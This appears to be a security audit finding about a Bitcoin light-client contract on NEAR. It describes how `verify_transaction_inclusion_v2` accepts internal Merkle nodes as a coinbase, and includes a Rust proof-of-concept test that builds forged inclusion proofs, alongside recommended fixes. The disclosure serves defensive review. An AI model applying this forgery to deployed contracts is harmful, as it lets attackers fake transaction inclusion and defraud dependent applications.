### Title
Coinbase Mitigation Bypass via Internal-Node Forgery in `verify_transaction_inclusion_v2` — (`contract/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion_v2` is intended to defeat the 64-byte transaction Merkle-proof forgery attack by requiring a valid coinbase proof. However, it never checks that `coinbase_tx_id` is the *actual* coinbase transaction of the block. Any internal Merkle-tree node that satisfies `compute_root_from_merkle_proof(X, 0, proof) == merkle_root` is accepted as a valid "coinbase". An unprivileged NEAR caller can supply such a node, fully bypassing the mitigation and proving a second internal node as a "transaction".

---

### Finding Description

The guard in `verify_transaction_inclusion_v2` is:

```rust
require!(
    merkle_tools::compute_root_from_merkle_proof(
        args.coinbase_tx_id.clone(),
        0usize,
        &args.coinbase_merkle_proof,
    ) == header.block_header.merkle_root,
    "Incorrect coinbase merkle proof"
);
``` [1](#0-0) 

This only verifies that *some* value at index 0 with *some* proof reconstructs the root. It does not verify that `coinbase_tx_id` equals the actual coinbase transaction stored in the block.

`compute_root_from_merkle_proof` is a plain iterative hash-chain with no domain separation or leaf/internal-node distinction:

```rust
for proof_hash in merkle_proof {
    if current_position % 2 == 0 {
        current_hash = compute_hash(&current_hash, proof_hash);
    } else {
        current_hash = compute_hash(proof_hash, &current_hash);
    }
    current_position /= 2;
}
``` [2](#0-1) 

For a block with four transactions `[T0, T1, T2, T3]`:

```
N01 = dsha256(T0 || T1)
N23 = dsha256(T2 || T3)
root = dsha256(N01 || N23)
```

An attacker sets:
- `coinbase_tx_id = N01`, `coinbase_merkle_proof = [N23]`  
  → `compute_root_from_merkle_proof(N01, 0, [N23])` = `dsha256(N01||N23)` = `root` ✓ — coinbase guard passes
- `tx_id = N23`, `tx_index = 1`, `merkle_proof = [N01]`  
  → `compute_root_from_merkle_proof(N23, 1, [N01])` = `dsha256(N01||N23)` = `root` ✓ — inclusion check passes

Both proofs have length 1, satisfying the equal-length constraint:

```rust
require!(
    args.merkle_proof.len() == args.coinbase_merkle_proof.len(),
    "Coinbase merkle proof and transaction merkle proof should have the same length"
);
``` [3](#0-2) 

The function returns `true` for `tx_id = N23`, which is an internal node, not a real transaction. The coinbase mitigation is completely bypassed.

The function is public — no `#[private]`, no `#[trusted_relayer]`, no role check — so any NEAR account can call it: [4](#0-3) 

---

### Impact Explanation

The v2 function was introduced specifically to prevent the [64-byte transaction Merkle-proof forgery](https://www.bitmex.com/blog/64-Byte-Transactions). By accepting any internal node as `coinbase_tx_id`, the mitigation is rendered inoperative. An attacker can prove that an internal Merkle node (64 bytes of raw hash data) is a "confirmed transaction" in a real Bitcoin block, returning `true` from the contract's inclusion oracle for a transaction that does not exist.

Any downstream contract or application that trusts `verify_transaction_inclusion_v2` to guarantee real transaction inclusion is exposed to the same forgery the function was designed to block.

---

### Likelihood Explanation

- No special privileges required; the function is a public view call.
- The attacker only needs a real block already in `headers_pool` (submitted by the relayer in normal operation).
- Internal nodes are trivially computable from the block's transaction list, which is public Bitcoin data.
- The equal-length constraint is satisfied automatically when both proofs are taken from the same tree level.

---

### Recommendation

Replace the Merkle-root equality check with a check that `coinbase_tx_id` equals the stored or independently derived coinbase transaction hash. Concretely:

1. Store the coinbase transaction hash alongside each block header when it is submitted, or
2. Require the caller to supply the raw coinbase transaction bytes, compute its txid on-chain, and verify that txid against the Merkle proof.

Additionally, adopt a leaf/internal-node domain separator (prefix `0x00` for leaves, `0x01` for internal nodes) in `compute_hash` to structurally prevent internal-node forgery at the hashing layer.

---

### Proof of Concept

```rust
// Rust unit test (no NEAR runtime needed)
use merkle_tools::{compute_root_from_merkle_proof, H256};
use btc_types::hash::double_sha256;

fn dsha(a: &H256, b: &H256) -> H256 {
    let mut v = Vec::with_capacity(64);
    v.extend_from_slice(&a.0);
    v.extend_from_slice(&b.0);
    double_sha256(&v)
}

#[test]
fn internal_node_forgery_bypasses_coinbase_check() {
    // Four arbitrary leaf hashes (stand-ins for real txids)
    let t0 = H256([1u8; 32]);
    let t1 = H256([2u8; 32]);
    let t2 = H256([3u8; 32]);
    let t3 = H256([4u8; 32]);

    // Build the tree
    let n01 = dsha(&t0, &t1);   // internal node at level 1
    let n23 = dsha(&t2, &t3);   // internal node at level 1
    let root = dsha(&n01, &n23);

    // Attacker's forged coinbase proof: use n01 as "coinbase_tx_id"
    let coinbase_root = compute_root_from_merkle_proof(n01.clone(), 0, &vec![n23.clone()]);
    assert_eq!(coinbase_root, root, "coinbase guard passes with internal node");

    // Attacker's forged tx proof: prove n23 as "tx_id" at index 1
    let tx_root = compute_root_from_merkle_proof(n23.clone(), 1, &vec![n01.clone()]);
    assert_eq!(tx_root, root, "inclusion check passes for internal node");

    // Both proofs have length 1 — equal-length constraint satisfied.
    // verify_transaction_inclusion_v2 would return true for tx_id = n23,
    // which is NOT a real transaction.
}
``` [5](#0-4) [6](#0-5)

### Citations

**File:** contract/src/lib.rs (L346-369)
```rust
    #[pause]
    pub fn verify_transaction_inclusion_v2(&self, #[serializer(borsh)] args: ProofArgsV2) -> bool {
        require!(
            args.merkle_proof.len() == args.coinbase_merkle_proof.len(),
            "Coinbase merkle proof and transaction merkle proof should have the same length"
        );

        let header = self
            .headers_pool
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("cannot find requested transaction block"));

        require!(
            merkle_tools::compute_root_from_merkle_proof(
                args.coinbase_tx_id.clone(),
                0usize,
                &args.coinbase_merkle_proof,
            ) == header.block_header.merkle_root,
            "Incorrect coinbase merkle proof"
        );

        #[allow(deprecated)]
        self.verify_transaction_inclusion(args.into())
    }
```

**File:** merkle-tools/src/lib.rs (L33-52)
```rust
#[must_use]
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
```
